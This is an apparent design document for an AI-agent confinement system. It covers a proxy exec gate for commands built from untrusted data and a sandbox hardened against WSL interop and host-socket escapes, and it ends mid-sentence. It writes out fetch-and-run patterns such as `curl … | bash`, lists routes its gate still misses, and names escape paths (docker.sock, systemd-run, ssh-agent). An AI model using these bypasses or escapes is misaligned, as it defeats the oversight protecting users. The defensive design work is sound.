# Mandu — Exec Routing (classify at the proxy, enforce at the exec boundary)

> **Status: frozen with the integrity axis (2026-09-28)**
> ([`protection-modes.md §10`](../architecture/protection-modes.md)), except for
> the shared machinery named below, which is maintained and runs in `secrets`
> mode.
>
> - **Integrity-only (frozen):** routing by untrusted symbols (AgentShell /
>   HumanShell chosen from inbound trust, §3–§5), the provenance gate on
>   fetched program text (§3.3, §8.7), and exec-output trust with the clean
>   box (§8). In the arbiter the provenance gate runs only with the integrity
>   axis ON; the launcher turns the clean box on only where the integrity axis
>   is ON and the session guard hosts it (§8.5.1).
> - **Shared (maintained, runs in `secrets`):** the `execGate` op and the
>   proxies' exec gate (§3.1–§3.2: the symbol-as-command block applies to any
>   symbol, and a high-confidentiality session's shell gate rides the same
>   op), the exec box `mandu-exec-box` and its hardening (§4, §4.1–§4.3), the
>   refusal message (§5), and the launcher's kernel rungs (§7: `--exec-box`,
>   `--landlock-net`, `--net-guard` with its secret-taint legs, §7.5). All of
>   these are on by default in `secrets` mode where the kernel supports them.
>
> Built: Phase 0 (proxy classification and gate), Phase 1 (the Linux
> AgentShell box, correlation), Phase 2 (approval-gated escalation, the macOS
> Seatbelt profile), and the launcher wiring of §7. Not built: the runtime
> loop that would drive a `needs_*` escalation from a live connect failure.

> Companion to [`architecture-map.md §9`](../architecture/architecture-map.md) §③
> (the exec chokepoint layers this doc fills), the exec policy in
> `arbiter/policy/exec-classify.ts` (`classifyExec` / `resolveExecArgv`) and
> `arbiter/policy/untrusted-command-execution.ts` (the symbol-as-command
> detector), [`privilege-model.md`](../architecture/privilege-model.md) §3.1
> (the cooperative-boundary threat model), the sensitive-path gate in
> [`fs-sync.md`](./fs-sync.md) §1.4.1
> (`interceptors/anthropic-proxy/src/fs-gate.ts`, the *gate on the wire, fail
> closed* pattern the exec gate mirrors), and
> [`privilege-model.md §6`](../architecture/privilege-model.md) §3 (the
> sandbox-runtime shape Phase 1 wraps). Terminology pairs the paper term with
> the repo term (*AgentView (repo: Agent File System)*, *T-LLM (privileged
> LLM)*).

## 1. Why this exists — the gap Phase 0 closes

The four chokepoints (`mandu.md` §4) each recover one boundary. Without this
design, the exec boundary had only `interceptors/exec-wrap` shadowing three
network tools (curl/wget/nc) with a PATH shim. Everything else the model runs
executed with no exec-side mediation, which leaves two holes:

1. **The PATH shim only sees what PATH resolves.** An injected `/usr/bin/curl …`,
   a shell builtin, or a `PATH=/usr/bin …`-prefixed command bypasses it.
2. **No classification happens where the command is first *legible*.** The
   model proxy sees the command as the model wrote it, with `$MDU:*` tokens
   exactly where untrusted `tool_result` data was spliced in, *before* any
   shell expansion. That is the one layer that can tell "the agent is about to
   run a command built out of untrusted data" from an ordinary command, with
   full session context, and gate it before it reaches the agent.

Rewriting the command string at the proxy sees *semantics* (which argument is a
symbol, which is code) but not runtime expansion (`$(…)`, `eval`,
variable-set paths). A PATH/exec wrapper sees *ground-truth argv* but not
session context. The design layers them: **classify where it is legible (the
proxy), enforce where it is real (the exec boundary).** Neither rewrites
arbitrary shell; that would be a sanitizer, not a reference monitor. The
"rewriting" that matters (Phase 1) is a *world swap* (a namespace whose bound
paths ARE the AgentView), not string surgery.

## 2. The invariant, restated for exec

> Untrusted data reaches T-LLM only as an opaque symbol.

At the proxy layer nothing is desymbolized, so a command carrying `$MDU:*`
is already opaque: echoing or piping it prints the literal token, which
re-enters symbolized (the E4 property). Opacity is *lost by construction* only
when a symbol sits in a **command / code-execution position**: a downstream
interpreter that desymbolized and ran it (the HumanShell path, or any future
desymbolize-before-exec) would turn untrusted data into executed code. That,
and only that, is what Phase 0 blocks. Data-position symbols (`grep foo $SYM |
wc -l`) stay opaque and are the respective egress chokepoint's job (network
destination → net-proxy; file write → fs chokepoint). **Not over-blocking the
data-position case is a first-class requirement**: it keeps the
`count-security` / `inspect-*` utility scenarios working.

## 3. Phase 0 — proxy exec classification + gate (implemented)

### 3.1 Arbiter: the `execGate` op

`arbiter/policy/exec-gate.ts`: a pure, exec-free decision over a raw command
string, composed from the lifted modules:

```
execGate({ command, cwd? }) -> {
  decision: "allow" | "block",
  reason: string,
  symbols: string[],              // symbols in command/code position (block cause)
  evasion: { kind, evidence }[],  // NON-blocking signals recorded for Phase 1 + UI
  shell: "AgentShell" | "HumanShell",   // informational (classifyExec, no hints)
  identifier: string | null,
}
```

- **block** iff `detectUntrustedCommandExecutionPatterns(command, {action:"block"})`
  matches: an `$MDU:*` is the whole command, inside `sh -c <sym>` /
  `python -c <sym>` / `node -e <sym>`, or in a code heredoc. The exec
  supervisor and the `asCommand` egress gate use the same detector, so the
  proxy and the exec boundary agree by construction.
- **evasion** (informational only): an absolute-path invocation of a known
  network tool (`/usr/bin/curl`, `/bin/nc`, …) that would bypass the PATH
  shim, and inline `VAR=`/`PATH=`/`env` prefixes. Recorded on the event and
  returned for shell routing; it does **not** block on its own (no untrusted
  data is implicated, and legitimate absolute-path use is common).
- **allow** otherwise. Data-position symbols pass through opaque.

The server layers two more checks on the same op: the provenance gate
(§3.3, integrity axis only) and, with the confidentiality axis on, a
high-confidentiality session's shell gate (every command needs approval,
because the box's net capability is not provable from the proxy). Wire-up
mirrors `classifyExec`/`resolveExecArgv`: `protocol.ts` request/result +
`server.ts` dispatch. The pure module is unit-tested with no daemon.

### 3.2 Proxy: gate on the response wire

`interceptors/anthropic-proxy/src/exec-gate.ts` (and the openai-proxy twin)
mirror `fs-gate.ts`, one step earlier in the same `toolInputTransform` hook:

- Scope: tools with a command field (`EXEC_COMMAND_FIELDS = { Bash: "command" }`
  for Claude; `{ shell: "command", "local_shell": "command" }`-shape for Codex).
  Non-command tools return `null` (verbatim). The anthropic-proxy serves
  several agents, so the command field comes from the session's gate surface,
  answered by the arbiter next to the agent's inbound spec (`gateSurface` op,
  `arbiter/policy/tool-gate-surface.ts`): OpenCode `bash.command`, OpenClaw
  `exec.command`, Goose `shell.command` (supported-agents.md §5.6); when the arbiter cannot say, the proxy uses the union of
  every agent's table, so no agent's shell loses the gate
  (agent-e2e-harness.md §7 item 7). The shell's working directory
  (`bash.workdir`, `exec.workdir`) is a path field for the sensitive-path
  gate, and a denied one also rewrites the command to the block sentinel:
  OpenClaw runs a command whose workdir does not exist in its own cwd or the
  home directory, so the path sentinel alone would not stop it
  (supported-agents.md §2.1).
- **block → rewrite the command field**, like fs-gate's denied-path sentinel:
  the field becomes a benign failing command `echo '<message>' 1>&2; exit 77`
  (exit 77 mirrors exec-wrap's `BLOCK_EXIT_CODE`). The agent runs *that*; its
  stderr/exit ride back, the command never executes, the session continues.
  The message is **static** (no AgentView paths, no raw untrusted bytes), so
  it adds no leak surface. The human sees the real reason on the `exec_gate`
  event and the dashboard.
- **the model reads the notice back in clear** (2026-10-04): the proxy
  remembers the notice it put in each sentinel by tool_use id
  (`ExecGateNotices`), and a result that is exactly that notice (alone, or
  as Claude Code's `Exit code 77\n<notice>`) is forwarded as the proxy's
  own text, bypassing a classify verdict that called it secret because the
  notice says "secret". Any other byte keeps the result on the classify
  path. The openai-proxy does the same by `call_id`, for Codex's exec
  envelope saying exit 77 plus exactly the notice, with the envelope's run
  facts blanked as plan 13 §9 R4 blanks a masked result's, and (2026-10-09)
  for a code-mode cell it replaced whole by the sentinel cell, keyed by the
  cell's own `call_id`. `confidentiality-plan-10-flow-taint.md` §11.8, "The exec gate's own
  notice".
- **allow → the command as written, or requoted** (2026-10-11): an allow
  may carry `requoted`, the command with each secret placeholder the shell
  would expand (`"…$MDU:…"`, unquoted, an expanding here-document) written
  so the program receives it whole (`arbiter/policy/shell-placeholder-quoting.ts`).
  Both proxies deliver it to a shell tool only, and the model reads back the
  command it wrote, as it does a blocked one (the anthropic-proxy's
  `NetGateHistory`, the openai-proxy's `exec-history.ts`, 2026-10-12). Confidentiality-axis work: `confidentiality.md` §7, "A
  placeholder the agent's shell would expand".
- **fail closed**: an arbiter error or a per-decision timeout is enforced as
  the same block sentinel (reason `unreachable`), never a fall-through to the
  raw command. Bounded by `DEFAULT_EXEC_GATE_TIMEOUT_MS`, so a wedged arbiter
  can only block, never stall the relay.
- The gate runs **independent of the view map** (it needs no workspace
  roots), so it is active on a non-git / no-worktree launch. It is default-on
  (`ProxyOptions.execGate`, default `true`); disabling it is a test-only
  affordance.

### 3.3 What Phase 0 does and does not buy

Buys: (a) the symbol-as-command case is refused at the earliest legible layer,
ahead of the exec boundary; (b) the classification and evasion signals are
**recorded** (`recordToolCall` correlation + `exec_gate` event), so Phase 1's
enforcement and the dashboard have ground to stand on; (c) deployments
without the kernel tier still get exec-side classification. Does **not** buy:
network or file egress of data-position symbols (those stay opaque until their
own chokepoint). Phase 0 is the classifier and the early gate; Phase 1 is the
enforcer.

**The no-symbol executed-code case is gated on provenance (built
2026-09-04, integrity axis only).** The token gate is structurally blind to
`curl -o setup.sh` → `bash setup.sh`: no `$MDU:*` is on the wire, because the
bytes flow curl → disk → bash without re-entering the proxy. The gate's
provenance half (§8.7.1; `arbiter/policy/exec-program-text.ts` + the
`gateProgramText` wrap in `ipc/server.ts`) answers the same `execGate` op by
asking *where the program text came from*: an allowed fetch-to-disk
**declares** its output net-written in the taint registry; a later command
whose program text (script argument, `source`, `./x`, `bash < x`, `cat x |
bash`, `bash -c "$(cat x)"`) resolves to a declared or kernel-observed
`file_taint` row, or whose program is fetched bytes in the string itself
(`curl … | bash`, `bash <(curl …)`, `eval "$(curl …)"`), is refused on the
wire (the same exit-77 sentinel) pending a human approval, queued
`exec-program:<host>` × path like every other gate. It denies on
*affirmative* taint only: unknown or pre-existing scripts, and every
read-not-execute of a fetched file, pass.

Still unmediated: shell expansion the pure readings do not follow
(`f=setup.sh; bash $f`), a copy or rename before the run (`cp setup.sh run.sh
&& bash run.sh`), an unrecognized fetcher (`python -c "urllib…"`), and a
schemeless bare-host `curl example.test` with no path. Kernel-observed
`file_taint` rows would close the first two through the same lookup once that
writer runs; the AgentShell world swap (Phase 1) contains all of them.

## 4. Phase 1 — Linux AgentShell backend

Enforcement = **swap the world, not the words.** The `exec-supervisor` fork
model is the *shell entry*: for each exec it decides the view (`plan_exec`),
then launches the command inside the chosen world.

1. **Correlation (implemented — §4 step 1).** The arbiter's `execGate` op
   RECORDS its verdict (block / shell / evasion) keyed by the command's
   `execSignature` (`arbiter/policy/exec-signature.ts`: it unwraps `bash -c`
   wrappers so the model's command string and the ground-truth argv reduce to
   the same core, tokenizing each payload once as the shell already unquoted it
   and writing the words back in one canonical quoting, so argument boundaries
   count (plan 13 §3 D7; the call-root recorder binds a tool call by the same
   key); the `ExecDecisionStore` holds it bounded and in memory). The
   supervisor's `plan_exec` re-runs `classifyExec` on the **ground-truth
   argv**, consults `execDecisionFor`, and takes the **more restrictive** of
   the two: a recorded block / AgentShell / evasion TIGHTENS a HumanShell
   classification to AgentShell. It only ever tightens; a miss or arbiter
   error is a no-op, so fuzziness costs utility, never security. (A blocked
   command already reaches the supervisor as the benign exit-77 sentinel;
   correlation adds the evasion → AgentShell hint.)
2. **The AgentShell world (implemented).** `sandbox::plan_sandbox` produces
   the asymmetric overlay and `sandbox::bwrap_argv` renders it as a
   **bubblewrap** command line (the unprivileged-userns realization, in the
   shape of Anthropic's Apache-2.0 `sandbox-runtime`,
   `privilege-model.md §6` §3); the fork model's `Bubblewrap` backend execs
   it (the default backend; the legacy `InProcess` `unshare`+`mount` path is
   opt-in). The bubblewrap is resolved in the parent by `sandbox::resolve_bwrap`:
   the first `bwrap` on PATH whose directory and real path are outside the
   command's cwd, the workspace, the AgentView worktree and the box's own cwd (empty and relative
   entries skipped), exec'd by that path; none found, the box exits 126 and
   never falls back to an `execvp` PATH search that could run a `./bwrap`
   planted in the workspace (rootless-confinement-ubuntu-2404.md §0.7). The world: **RW = AgentView worktree** (bound over the workspace
   path), **RO = the rest of the real filesystem**, **net = off**, fresh
   `/dev` `/proc` and a writable `/tmp` scratch (a fresh tmpfs; in the
   integrity-OFF box the agent's own `/tmp` instead, §7.2 "The agent's own
   `/tmp`"), plus the full unprivileged
   hardening set, all on by default (privilege-model.md §0): the **PID / IPC /
   UTS / cgroup** namespaces unshared, a **new session** (TIOCSTI injection
   block), **`--cap-drop ALL`**, **`--disable-userns`** (probe-gated, always
   paired with `--unshare-user`, which bwrap ≥ 0.8 requires; below bwrap 0.8
   the seccomp filter owns the userns-nesting denial — `unshare`/`clone` +
   `CLONE_NEWUSER` → EPERM, `clone3` → ENOSYS), and a **seccomp deny-filter**
   of dangerous syscalls passed as `--seccomp <fd>` (`sandbox::seccomp_filter`;
   fail-closed: an AgentShell exec whose filter cannot be built is refused).
   Landlock (`fs-supervisor::landlock`) enforces the same RO/RW overlay at the
   LSM layer on kernel ≥ 5.13, in both backends: under Bubblewrap an
   interposed in-box `mandu-landlock-apply` restricts *after* bwrap's mounts
   (a Landlock-restricted thread cannot `mount(2)`; a missing applier degrades
   to mounts only), and the InProcess backend calls `restrict_self_to_plan`
   in the forked child before `execve` (fail-closed exit 71 on a supporting
   kernel). The plan adds a deny-all-TCP net leg on ABI ≥ 4 (kernel ≥ 6.7)
   and a WRITE_FILE-only `/dev` carve-out (`> /dev/null` works; nothing can be
   created under `/dev`). `cat notes.md` naturally reads the symbolized
   AgentView twin at the same path: no "which argument is a path?" question
   arises, and builtins, redirections and interpreters are all confined
   because the namespace does not care what runs. This is the exec analogue
   of the P4 ViewMap, realized as a mount instead of string rewriting. The
   model's command runs **verbatim**. A privileged userns integration test
   proves it: an AgentShell command reads the symbolized copy, a write inside
   the AgentView succeeds, a write outside is denied, and egress is dead. The
   utility cost of reading the symbolized copy (`grep` finds nothing, `sed -n
   '3p'` has no line 3) is answered by a trusted per-call note,
   `symbol-twin-shell-blindness.md`.

The asymmetric RW/RO overlay is the make-or-break detail: read-through of
untracked paths is safe (reads reach the model only via Bash-result
symbolization, the E4 guarantee), tracked or untrusted files appear as their
symbolized twins, and the namespace only has to *deny writes outside the
AgentView and all egress*. AgentView completeness (node_modules, build state)
is where iteration concentrates; the `needsOriginalFs` escalation (Phase 2)
is the outlet. Bubblewrap ordering (`sandbox::bwrap_argv`) layers RO base →
fresh dev/proc → tmpfs scratch → the writable AgentView bind LAST, so the
explicit RW bind wins.

**A project under `/tmp`.** The scratch is a fresh tmpfs over `/tmp`, so a
project that itself lives under `/tmp` would vanish in-box when there is no
AgentView bind to bring it back (every boxed command died with `bwrap: Can't
chdir`). The pure plan carries `ro_keep_binds` (`sandbox::tmpfs_keep_binds`):
the WORKSPACE (else, for a bin run with no workspace, its cwd) is bound back
**read-only at its own path**, right after the tmpfs, when it is a clean
absolute path strictly under the tmpfs and not already covered by an RW bind.
The launcher supplies the workspace: with no view pair, `applyExecBox` bakes
the realpath of the launch directory as `MANDU_WORKSPACE` (and unsets any
ambient `MANDU_AGENTVIEW_ROOT`). Only that path comes back; every other `/tmp`
entry stays invisible (a cwd elsewhere under `/tmp` is NOT re-bound), and
`/tmp` itself is never re-bound. With the integrity axis off the project is
bound WRITABLE instead (§7.2, "The workspace without an AgentView") and needs
no keep; there the box shows the agent's own `/tmp` anyway (§7.2, "The
agent's own `/tmp`"), and this paragraph applies to the integrity-ON box
only. Secret twins inside the project survive (bwrap binds are recursive
and read their source from the confined agent's own mount namespace). **The
clean box never renders the keep**: its Landlock leg grants `--rw` over the
whole scratch mount, which would reach the re-bound project and let untrusted
project bytes into a "clean" output; without it the clean attempt cannot
chdir, exits nonzero, and the ordinary box reruns the command (§8.4, the usual
fallback). Guarded by the pure unit tests in `sandbox.rs`, the launcher
shim/setup unit tests, the kernel test
`bubblewrap_backend_runs_a_project_under_tmp`, and
`launcher/test/exec-box-live.test.sh` §3d (the real shim and bin).

**The bwrap probe, kept by content (2026-10-09).** Whether to pass
`--disable-userns` is a `bwrap --help` probe the box runs in the parent,
once per process (`kernel::bwrap_supports_disable_userns`). Every boxed
command is its own `mandu-exec-box` process, so every command paid a fork +
exec of bubblewrap for it (about 7 ms under the guard, 1 to 2 ms bare).
The launcher now asks once: `applyExecBox` resolves the box's bubblewrap
(`plan.bwrapDir`'s, Mandu's own copy or an administrator's `bwrap_path`,
else the distribution's, bwrap-path.ts), runs its `--help`
(`keptBwrapDisableUserns`; the pass itself is kept for the boot as the
`bwrap-help` probe, packaging.md §5.4), and when it advertises the flag
bakes the **sha256 of its bytes** into the shims as
`MANDU_BWRAP_DISABLE_USERNS_SHA256` (anything else bakes an `unset`). The
box skips its probe only when the bubblewrap it resolved itself
(`resolve_bwrap`, by real path) hashes to exactly that value
(`sandbox::bwrap_known_disable_userns`); otherwise it probes as before. The
rules:

- **Keyed by content, not by path or stat identity.** A replaced, patched or
  different bubblewrap (another on PATH, an upgrade mid-session) hashes
  differently and is probed afresh; no one can make two binaries collide.
  Reading the binary (80 KiB on the dev host) costs less than its exec.
- **Only the positive answer exists.** There is no kept "unsupported": a
  value can only claim that a bubblewrap takes `--disable-userns`. The agent
  can run the box with any environment, so suppose it forges one for a
  bubblewrap < 0.8: the box passes the flag, that bubblewrap rejects the
  whole argv, and the command fails without running. Wrong answers cost a
  failed command, never a weaker box (the seccomp swap is the fallback for a
  bwrap that lacks the flag, and is reached only by a fresh probe).
- **The host-socket scan is NOT cached**: which host sockets exist is the
  security input of `socket_box_hide` and changes under a session; it stays
  per command.

Measured on the dev host (Linux 7.0, bubblewrap 0.11.1, bare, no guard):
the probe was 6 ms of a boxed `true` under `strace`, about 1.3 ms
unstraced; a boxed `true` through `mandu-exec-box` moved from a median of
27.5-28.5 ms to 26.2 ms (60 runs each, interleaved), and `strace -f` shows
no `bwrap --help` with the kept answer and one without. Proved by the unit
tests in `sandbox.rs` (only the very bytes; a malformed value, a missing file,
changed bytes each probe) and `launcher/test/unit/exec-box-shims.test.ts`
(the launcher's probe, the hard export / unset, kept for the boot, a replaced
binary asked again), and end to end by `launcher/test/exec-box-live.test.sh`
§3h (real shims and bin over two delegating stand-ins: the kept answer skips
the probe, changed bytes are probed again, a forged answer for an old
bubblewrap fails the command closed, the old one probed still runs).

Phase 2's per-binary utility adapters (a `curl` shim → net-proxy mock, a `git`
shim → fs-sync) then run *inside* AgentShell as function on top of a real
boundary: the shims survive as utility, not as the security mechanism.

### 4.1 WSL2: the Windows interop door (2026-09-27)

WSL2 runs a real Linux kernel, so everything above holds there unchanged. What
WSL2 adds is a way out of every Linux box. The kernel carries a binfmt_misc
entry, `WSLInterop`, that hands any PE executable (`cmd.exe`,
`powershell.exe`, an `.exe` the command wrote itself) to `/init`, which asks
the Windows side, over the Unix socket `$WSL_INTEROP` names
(`/run/WSL/<pid>_interop`), to start the program. That program runs as the
Windows user, outside every namespace, Landlock domain and seccomp filter: it
can read the real Linux files through `\\wsl.localhost\<distro>\…` and reach
any host. A second channel is `AF_VSOCK` (Hyper-V sockets to the Windows
host), which `--unshare-net` does not cut: vsock is not network-namespaced on
the 6.6 WSL kernels.

**The capability is the socket, not the `.exe`.** The binfmt entry carries
the `F` flag, so the kernel opened `/init` when the entry was registered and
runs it with no path lookup: hiding `/init` or denying execute on `/mnt/*` does
not stop a PE copied elsewhere. With the socket unreachable, the interop
client has nobody to ask. So the closures are:

- **AgentShell box (exec-supervisor, race-free).** On a WSL host (any one
  signal: a `microsoft` kernel release, a set `$WSL_INTEROP`, or the
  `WSLInterop` binfmt entry; `mandu_arbiter::wsl`), the pure
  `sandbox::wsl_box_hide` adds an empty tmpfs over `/run/WSL` and `/mnt/wslg`
  (WSLg's X11/Wayland/RDP sockets), and `/dev/null` over `/init` and over the
  `$WSL_INTEROP` socket when it lives elsewhere (canonicalized first), probed
  on the host side before the fork. Everywhere, not only on WSL:
  `WSL_INTEROP` joins the box's unset list, and the seccomp filter refuses
  `socket(AF_VSOCK)` with `EAFNOSUPPORT` and denies io_uring (whose SQEs open
  and connect sockets without passing the `socket(2)` check). Both denials
  cost a net-off box nothing and also close the VM-guest-to-hypervisor
  channel on any Linux guest; Node and libuv fall back from io_uring on
  `EPERM`. Since §4.2 the box replaces all of `/run` with an empty tmpfs,
  which already covers `/run/WSL`; the WSL entries still matter for
  `/mnt/wslg`, `/init` and a `$WSL_INTEROP` socket outside `/run`.
- **Whole agent (net-guard).** The agent itself is not boxed, so on WSL the
  connect guard refuses (`EACCES`, with a `wsl-interop` event) every
  `AF_VSOCK` connect and every Unix connect that lands on an interop socket
  (`guard::WslGuard`). The guard probes WSL itself, so a launcher that forgot
  cannot leave the door open. **The Unix check is race-free:** the guard does
  not check a path and answer `CONTINUE` (the kernel would re-resolve it, so a
  swapped symlink would race past and a hardlink would never be caught). It
  SUPERVISES the connect (`guard_kernel::supervised_unix_connect`): it opens
  the target `O_PATH` in the tracee's view (`openat2` under
  `/proc/<tid>/root` with `RESOLVE_IN_ROOT`, a relative path joined to the
  tracee's cwd, `/proc/self/fd/N` as the tracee's own descriptor N;
  `guard::plan_unix_lookup`), refuses when that inode is an interop socket (by
  identity: every entry of `/run/WSL` and the `$WSL_INTEROP` socket, stat'ed
  at check time and at guard start; or by the path the kernel reports for the
  opened file), and otherwise grabs the tracee's socket (`pidfd_getfd`) and
  connects it to `/proc/self/fd/<N>` of the checked descriptor, so the kernel
  connects exactly the inode that was checked. A lookup error is answered as
  the connect's errno (never `CONTINUE`). The same supervision serves the
  other Unix checks: a secret socket (policy.yaml `ssh_agent`) is matched by
  inode, and a tainted process's `unix:` bindings are judged on the opened
  file's path. **Costs:** where a check applies, a Unix connect through a
  magic link other than `/proc/self/fd/N` fails `ELOOP`. **Residue:** on a
  kernel without `openat2`/`pidfd_getfd` (< 5.6, below every WSL2 kernel
  shipped) the guard falls back to canonicalize-then-`CONTINUE`; a
  `sendto(2)` to a datagram socket path is judged as a send (§7.5, "Sends are
  judged like connects"). The mount remains the belt to these braces: the
  secret-twin bwrap wrap (confidentiality.md §7.2) also adds `--tmpfs
  /run/WSL`, `/dev/null` over `/init` and `--unsetenv WSL_INTEROP` on WSL
  (`launcher/src/wsl.ts` `wslTwinWrapFlags`). The whole-agent wrap leaves
  `/mnt/wslg` alone (a live agent may use its display); the box hides it.
- **What losing interop costs.** Inside the box: nothing a net-off command
  needed. For the whole agent: Windows conveniences (opening a browser,
  pasting from the Windows clipboard via `powershell.exe`). Log in to the
  agent outside Mandu.
- **Not closed by design.** `/mnt/c` stays readable on the box's read-only
  base, as `/home` does: a read reaches the model only through Bash-result
  symbolization, and hiding the drive would not close the door (the socket
  is the door). Windows-side credential files
  (`/mnt/c/Users/*/.aws/credentials`, `_netrc`, `AppData/Roaming/gcloud`)
  ARE discovered: each Windows profile is probed as a second home, so the
  `secrets` mode twins them (confidentiality.md §7.2 "WSL2", with its
  residue). The legacy `InProcess` backend gets none of the hiding.

A launch says what it found (`wslLaunchNotes`): interop on with the guard (a
note), interop on without the guard (a WARNING naming `[interop]
enabled=false` in `/etc/wsl.conf`), a kernel before Landlock (5.13; `wsl
--update`), and a project on a Windows drive (drvfs; packaging.md §6.1).

Tests: the pure decisions in `sandbox.rs`, `seccomp_filter.rs`, `guard.rs` and
`mandu_arbiter::wsl` (unit); the kernel tests
`bubblewrap_backend_hides_the_wsl_interop_door`,
`guard_refuses_the_wsl_interop_socket`, `guard_refuses_vsock_on_wsl`,
`guard_supervises_unix_connects_on_wsl`,
`guard_wsl_check_survives_a_symlink_swap_race` (at least 400 connects through
a link another thread swaps between a benign socket and a stand-in interop
socket: none reach the stand-in, and the test requires both targets hit so it
is not vacuous) and `guard_refuses_a_secret_socket_by_inode`; and the
launcher e2e `wsl-interop.test.ts` (the real twin wrap under bwrap with
stand-in paths). All run on a plain Linux host with the WSL signals pinned;
none has run on Windows yet (os-test-matrix.md).

### 4.2 Host Unix sockets (2026-09-27)

The box's base is the whole host filesystem, read-only. Read-only does not
stop `connect(2)` on a Unix socket, and `--unshare-net` cuts only the
ABSTRACT socket namespace, not pathname sockets. Without this section a boxed
command could reach every host socket its user could: `/run/docker.sock` for
a docker-group user (a privileged container: a complete escape), the session
bus (`systemd-run --user`: run anything outside the box), `systemd --user`'s
private socket, the ssh-agent (sign as the user), a tmux, nvim, kitty or sway
server (type or run commands in the host session), the editor's IPC.

The box closes them by mount, in three parts (`sandbox::HostHide`, filled on
the host side by the kernel backend's `resolve_host_hide`, rendered before
the scratch tmpfs and the view binds):

- **`/run` is an empty tmpfs with an allow-list put back**
  (`sandbox::run_box_hide`). `/run` is where host daemons put sockets, and it
  churns (a typical desktop has well over a hundred sockets there, mostly
  editor IPC). Masking each costs a bwrap mount apiece (about 1.2 ms each)
  and races sockets that come and go, so the box hides the directory
  instead. Put back: every top-level symlink, recreated (NixOS
  `/run/current-system`, `/run/opengl-driver`; `/run/shm`); `RUN_KEEP`,
  read-only when present (`/run/wrappers`, NixOS's setuid wrappers on
  `PATH`; `/run/utmp`; `/run/.containerenv`; the systemd-resolved files
  `/etc/resolv.conf` links to); what the box itself needs from under `/run`
  (the Landlock applier in the scope run dir, the cwd, the workspace); every
  regular file an environment variable names under `/run` (a TLS-inspection
  CA bundle in the scope run dir); and `$XDG_RUNTIME_DIR` as an empty
  directory. A directory put back is scanned, and any socket inside it
  masked. A view bind whose source lives under `/run` is unaffected (bwrap
  takes bind sources from the old root).
- **Other socket locations are scanned and each socket masked**
  (`host_sockets::scan`, `sandbox::socket_box_hide`): `/var/run` when it is
  not the usual symlink to `/run`, `/var/lib/*` (`lxd`, `incus`),
  `/var/snap/*/common/*` (snap `lxd`), `$XDG_RUNTIME_DIR` when it is outside
  `/run` and `/tmp`, `$HOME`'s own entries, and the `$HOME` dot-directories
  that hold agent or VM sockets (`.ssh` ControlMaster sockets, `.gnupg`,
  `.docker`, `.colima`, `.lima`, `.rd`, `.1password`, podman machine).
  `/dev/null` is bound over each socket and FIFO found (a connect then fails
  `ECONNREFUSED`), and an empty tmpfs over each directory the scan can search
  but not list. The walk does not follow symlinks, skips non-local mounts
  (FUSE, NFS, 9p) without a stat, and stops at an entry budget. `/tmp` is not
  scanned where the box's fresh tmpfs hides it; in the integrity-OFF box,
  which shows the agent's own `/tmp` (§7.2), it is scanned last and for
  its own entries only (`host_sockets::TMP_SOCKET_DEPTH`: a database's
  `/tmp/.s.PGSQL.5432`), its host-service directories are hidden whole by
  name (`host_sockets::tmp_service_dirs`: `.X11-unix` and its family,
  `tmux-<uid>`, `ssh-<random>`, `pulse-<random>`, `screens`), a
  `$XDG_RUNTIME_DIR` under it is read in full, and each mask comes after
  the `/tmp` bind (a real-tree bind brings the host's entries back, so the
  masks under it are re-applied after it, as under the writable
  workspace). Not deeper: a mask under the real `/tmp` binds onto the host
  tree, so a socket that vanished between the scan and the box's setup
  would be re-created by bwrap as an empty file in the real `/tmp` (the MR
  pipeline of 2026-10-19 found a test's short-lived mock sockets left so);
  short-lived sockets live in a program's own subdirectory, where the
  box's connect allow-list still refuses them.
- **Sockets the environment names are masked, and the variable unset**
  (`sandbox::SOCKET_ENV`, `socket_paths_from_env`): `SSH_AUTH_SOCK`,
  `DBUS_SESSION_BUS_ADDRESS`, `DOCKER_HOST`, `CONTAINER_HOST`, `PULSE_SERVER`,
  `GPG_AGENT_INFO`, `TMUX`, `NVIM`, `NVIM_LISTEN_ADDRESS`, `KITTY_LISTEN_ON`,
  `SWAYSOCK`, `I3SOCK`, `HYPRLAND_INSTANCE_SIGNATURE`, `WAYLAND_DISPLAY` and
  the VS Code IPC handles, each parsed in its own syntax. Its target is
  masked wherever it is, and the variable joins `BOX_UNSET_ENV` so a tool
  fails fast instead of dialing a masked path.

On by default for every AgentShell box, with no switch (the non-root
principle: an unprivileged hardening is not optional); measured at about
13 ms per command on a test host. HumanShell commands and the whole agent
keep their sockets here (the whole agent's are §4.3).

**What it costs.** A boxed command sees an empty `/run`: nscd,
systemd-userdb and the resolver's varlink socket are gone, so name lookups
fall back to `/etc` files (a dynamic or homed user may show as a number), and
nothing that talks to a host daemon works (docker, podman, systemctl, gpg
with an agent, `ssh` through an agent or a ControlMaster). None of that
worked usefully in a net-off, read-only box before; now it fails instead of
escaping.

**The mount race.** A masked socket that disappears between the scan and
bwrap's mount leaves a mount point the read-only base cannot recreate, and
bwrap's setup fails before the command runs. The supervisor tells that apart
from the command's own failure by a "box is up" pipe: the interposed Landlock
applier, which bwrap runs only after every mount succeeded, writes one byte on
it (`--ready-fd`) before it restricts itself and execs the command. A box that
exited without the byte, while one of its mount points
(`HostHide::mount_points`) is gone, never ran the command: the supervisor
rescans and builds it once more (`sandbox::box_setup_raced`). A box that came
up is never rebuilt, so a command never runs twice. The allow-list's re-binds
render as `--ro-bind-try`. Without an applier (no Landlock) there is no
in-box hook, and a race fails that one command. Proved by the kernel test
`bubblewrap_backend_rebuilds_a_box_whose_masked_socket_vanished`.

**The socket allow-list.** The scan is a deny-list, and a socket outside its
roots that no variable names would stay reachable. On top of it, the box
connects only to Unix sockets it bound itself (`fs_supervisor::box_sockets`,
shared by both supervisors below):

- `bind` runs as issued; it reaches nothing. The supervisor keeps a copy of
  the socket (`pidfd_getfd`) and, once the bind has run, asks the kernel
  which file it created: `SIOCUNIXFILE` returns an `O_PATH` descriptor of
  exactly the bound inode, with no path re-resolved, so a rename or a
  swapped symlink cannot plant another file in the record. It needs
  `CAP_NET_ADMIN` in the user namespace owning the socket's network
  namespace, which the supervisor holds (bwrap creates the box's namespaces
  as a child of the supervisor's). The record is the file's `(st_dev,
  st_ino)` plus its birth time (change time where there is none), keyed by
  the socket's network namespace cookie, so a reused inode is another file
  and nothing has to be held open.
- `connect` is performed by the supervisor, never CONTINUEd. A pathname
  target is opened `O_PATH` in the box's own view (`openat2` with
  `RESOLVE_IN_ROOT` on `/proc/<tid>/root`), its identity must be one the box
  bound, and the box's socket is connected to exactly that inode
  (`/proc/self/fd/N`). Anything else is `ECONNREFUSED`, what a masked socket
